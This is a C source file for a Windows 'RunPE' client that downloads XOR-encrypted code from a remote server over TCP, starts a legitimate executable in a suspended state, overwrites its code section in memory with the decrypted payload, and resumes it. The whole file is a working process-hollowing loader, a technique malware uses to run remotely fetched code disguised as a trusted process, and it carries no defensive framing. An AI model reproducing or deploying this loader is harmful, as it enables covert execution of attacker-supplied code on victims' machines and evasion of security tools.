#include<Windows.h>
#include<stdio.h>

#pragma warning(disable: 4996)
#pragma comment(lib, "ws2_32.lib")

struct DOSHeader {
	char e_magic[2];
	unsigned short e_cblp;
	unsigned short e_cp;
	unsigned short e_crlc;
	unsigned short e_cparhdr;
	unsigned short e_minalloc;
	unsigned short e_maxalloc;
	unsigned short e_ss;
	unsigned short e_sp;
	unsigned short e_csum;
	unsigned short e_ip;
	unsigned short e_cs;
	unsigned short e_lfarlc;
	unsigned short e_ovno;
	char e_res1[8];
	unsigned short e_oemid;
	unsigned short e_oeminfo;
	char e_res2[20];
	unsigned long e_lfanew;
};

struct DOSStub {
	char dos_stub[64];
};

struct ImageFileHeader {
	unsigned short machine;
	unsigned short numberofsections;
	unsigned long timedatestamp;
	unsigned long pointertosymboltable;
	unsigned long numberofsymbols;
	unsigned short sizeofoptionalheader;
	unsigned short characteristics;
};

struct OptionalHeader {
	unsigned short magic;
	unsigned char majorlinkerversion;
	unsigned char minorlinkerversion;
	unsigned long sizeofcode;
	unsigned long sizeofinitializeddata;
	unsigned long sizeofuninitializeddata;
	unsigned long addressofentrypoint;
	unsigned long baseofcode;
	unsigned long baseofdata;
	unsigned long imagebase;
	unsigned long sectionalignment;
	unsigned long filealignment;
	unsigned short majoroperatingsystemversion;
	unsigned short minoroperatingsystemversion;
	unsigned short majorimageversion;
	unsigned short minorimageversion;
	unsigned short majorsubsystemversion;
	unsigned short minorsubsystemversion;
	unsigned long win32versionvalue;
	unsigned long sizeofimage;
	unsigned long sizeofheaders;
	unsigned long checksum;
	unsigned short subsystem;
	unsigned short dllcharacteristics;
	unsigned long sizeofstackreserve;
	unsigned long sizeofstackcommit;
	unsigned long sizeofheapreserve;
	unsigned long sizeofheapcommit;
	unsigned long loaderflags;
	unsigned long numberofrvaandsizes;
};

struct PEHeader {
	char signature[4];
	struct ImageFileHeader IFHeader;
	struct OptionalHeader OHeader;
};

struct DataDirectories {
	unsigned long virtualaddress;
	unsigned long size;
};

struct SectionHeader {
	char name[8];
	unsigned long virtualSize;
	unsigned long virtualAddress;
	unsigned long sizeOfRawData;
	unsigned long pointerToRawData;
	unsigned long pointerToRelocations;
	unsigned long pointerToLineNumbers;
	unsigned short numberOfRelocations;
	unsigned short numberOfLineNumbers;
	unsigned long characteristics;
};


typedef LONG(NTAPI* NtSuspendProcess)(IN HANDLE ProcessHandle);

void cats(char** str, const char* str2) {
	char* tmp = NULL;

	
	if (*str != NULL && str2 == NULL) {
		free(*str);
		*str = NULL;
		return;
	}

	
	if (*str == NULL) {
		*str = calloc(strlen(str2) + 1, sizeof(char));
		memcpy(*str, str2, strlen(str2));
	}
	else { 
		tmp = calloc(strlen(*str) + 1, sizeof(char));
		memcpy(tmp, *str, strlen(*str));
		*str = calloc(strlen(*str) + strlen(str2) + 1, sizeof(char));
		memcpy(*str, tmp, strlen(tmp));
		memcpy(*str + strlen(*str), str2, strlen(str2));
		free(tmp);
	}

}

UINT __stdcall Suspend(VOID* processId)
{
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)processId);

    NtSuspendProcess pfnNtSuspendProcess = (NtSuspendProcess)GetProcAddress(GetModuleHandle(L"ntdll"), "NtSuspendProcess");

    pfnNtSuspendProcess(processHandle);

    CloseHandle(processHandle);

    return 0;
}

UINT __stdcall Resume(VOID* processId)
{
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)processId);

    NtSuspendProcess pfnNtSuspendProcess = (NtSuspendProcess)GetProcAddress(GetModuleHandle(L"ntdll"), "NtResumeProcess");

    pfnNtSuspendProcess(processHandle);

    CloseHandle(processHandle);

    return 0;
}

int main(int argc, char** argv) {

	if (argc < 5) {
		printf("Argument Mismatch. Usage: \"RunPE Client.exe\" [InFile.exe] [IP Address] [Port] [Decryption Key] [(optional) Command Line Arguments]\n");
		return 1;
	}

	FILE* f;
	fopen_s(&f, argv[1], "rb");

	if (f != 0x0) {

		int bufferSize = 0;
		int hexData;

		if (f != 0)
			while ((hexData = fgetc(f)) != EOF) {
				bufferSize++;
			}

		char* hexBuffer = (char*)calloc(bufferSize, sizeof(char));
		char* hexBufferStart = hexBuffer;

		if (f != 0 && (bufferSize <= bufferSize * 1)) {
			rewind(f);
			fread_s(hexBuffer, bufferSize, 1, bufferSize, f);
			fclose(f);
		}

		struct DOSHeader* DOS;
		struct DOSStub* STUB;
		struct RICHHeader* RICH;
		struct RICH2PETransition* RICH2PE;
		struct PEHeader* PEH;
		struct DataDirectories* DATADIR[16];
		struct SectionHeader* SEh[4];

		char* PEBuffer = hexBufferStart;

		DOS = (struct DOSHeader*)(PEBuffer);
		PEBuffer = PEBuffer + sizeof(struct DOSHeader);

		STUB = (struct DOSStub*)(PEBuffer);
		PEBuffer = PEBuffer + sizeof(struct DOSStub);

		PEBuffer = PEBuffer + DOS->e_lfanew - sizeof(struct DOSStub) - sizeof(struct DOSHeader);

		PEH = (struct PEHeader*)(PEBuffer);
		PEBuffer = PEBuffer + sizeof(struct PEHeader);

		for (int i = 0; i < PEH->OHeader.numberofrvaandsizes; i++) {
			DATADIR[i] = (struct DataDirectories*)(PEBuffer);
			PEBuffer = PEBuffer + sizeof(struct DataDirectories);
		}

		if (PEH->OHeader.numberofrvaandsizes < 16) {
			for (int i = PEH->OHeader.numberofrvaandsizes; i < 16; i++) {
				DATADIR[i]->virtualaddress = 0;
				DATADIR[i]->size = 0;
				PEBuffer = PEBuffer + sizeof(struct DataDirectories);
			}
		}

		SEh[0] = (struct SectionHeader*)(PEBuffer);
		PEBuffer = PEBuffer + sizeof(struct SectionHeader);

		STARTUPINFO si = { sizeof(STARTUPINFO) };
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_SHOW;
		PROCESS_INFORMATION pi;

		wchar_t wtext[200];
		mbstowcs(wtext, argv[1], strlen(argv[1]) + 1);
		LPWSTR ptr = wtext;

		char* commandLineArgs = "";

		for (int i = 5; i < argc; i++) {
			cats(&commandLineArgs, argv[i]);
		}

		wchar_t wtext1[5000];
		mbstowcs(wtext1, commandLineArgs, strlen(commandLineArgs) + 1);
		LPWSTR ptr1 = wtext1;


		WSADATA winsockData;
		int iWSAStartup;
		int iWSACleanup;

		SOCKET TCPClientSocket;
		int iCloseSocket;

		struct sockaddr_in TCPServerAdd;
		int iTCPServerAdd = sizeof(TCPServerAdd);

		int iConnect;

		int iSend;
		char SendBuffer[] = { 'O', 'K', '.' };
		int iSenderBuffer = strlen(SendBuffer) + 1;

		int iRecv;
		char* RecvBuffer = (char*)calloc(SEh[0]->sizeOfRawData, sizeof(char));
		int iRecvBuffer = SEh[0]->sizeOfRawData;

		TCPServerAdd.sin_family = AF_INET;
		TCPServerAdd.sin_addr.s_addr = inet_addr(argv[2]);
		int port = atoi(argv[3]);
		TCPServerAdd.sin_port = htons(port);

		iWSAStartup = WSAStartup(MAKEWORD(2, 2), &winsockData);

		if (iWSAStartup != 0) {
			printf("Server Creation Failed.\n");
			free(RecvBuffer);
			free(hexBufferStart);
			WSACleanup();
			return -1;
		}
		else {
			printf("Server Created.\n");
		}

		TCPClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

		if (TCPClientSocket == INVALID_SOCKET) {
			printf("TCP Server Socket Creation Failed.\n");
			free(RecvBuffer);
			free(hexBufferStart);
			WSACleanup();
			return -2;
		}
		else {
			printf("TCP Server Socket Created At IP : %s Port %s\n", argv[3], argv[4]);
		}

		iConnect = connect(TCPClientSocket, (SOCKADDR*)&TCPServerAdd, sizeof(TCPServerAdd));
		if (iConnect == SOCKET_ERROR) {
			printf("Connection Failed.\n");
			free(RecvBuffer);
			free(hexBufferStart);
			WSACleanup();
			return -3;
		}
		else {
			printf("Connection Established.\n");
		}

		iRecv = recv(TCPClientSocket, RecvBuffer, iRecvBuffer, 0);

		if (iRecv == SOCKET_ERROR) {
			printf("Code Not Received.\n");
			free(RecvBuffer);
			free(hexBufferStart);
			WSACleanup();
			return -6;
		}
		else {
			printf("Code Received.\n");
		}

		iSend = send(TCPClientSocket, SendBuffer, iSenderBuffer, 0);

		if (iSend == SOCKET_ERROR) {
			printf("Acknowledgement Sending Failed.\n");
			free(RecvBuffer);
			free(hexBufferStart);
			WSACleanup();
			return -5;
		}
		else {
			printf("Acknowledgement Sent Successfully.\n");
		}

		iCloseSocket = closesocket(TCPClientSocket);

		if (iCloseSocket == SOCKET_ERROR) {
			printf("Error Closing Socket.\n");
			free(RecvBuffer);
			free(hexBufferStart);
			WSACleanup();
			return -7;
		}
		else {
			printf("Socket Closed Successfully.\n");
		}

		iWSACleanup = WSACleanup();


		int keylen = strlen(argv[4]);

		for (int i = 0; i < SEh[0]->sizeOfRawData; i++) {
				RecvBuffer[i] = RecvBuffer[i] ^ argv[4][i % keylen];
		}

		DWORD oldProtect = 0;
		long long written = 0;

		CreateProcess(ptr, ptr1, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pi.dwProcessId);
		VirtualProtectEx(processHandle, (PEH->OHeader.imagebase + SEh[0]->virtualAddress), SEh[0]->sizeOfRawData, PAGE_EXECUTE_READWRITE, &oldProtect);
		WriteProcessMemory(processHandle, (PEH->OHeader.imagebase + SEh[0]->virtualAddress), RecvBuffer, SEh[0]->sizeOfRawData, &written);
		VirtualProtectEx(processHandle, (PEH->OHeader.imagebase + SEh[0]->virtualAddress), SEh[0]->sizeOfRawData, oldProtect, &oldProtect);
		CloseHandle(processHandle);
		Resume(pi.dwProcessId);
		free(hexBufferStart);
	}

		return 0;
	}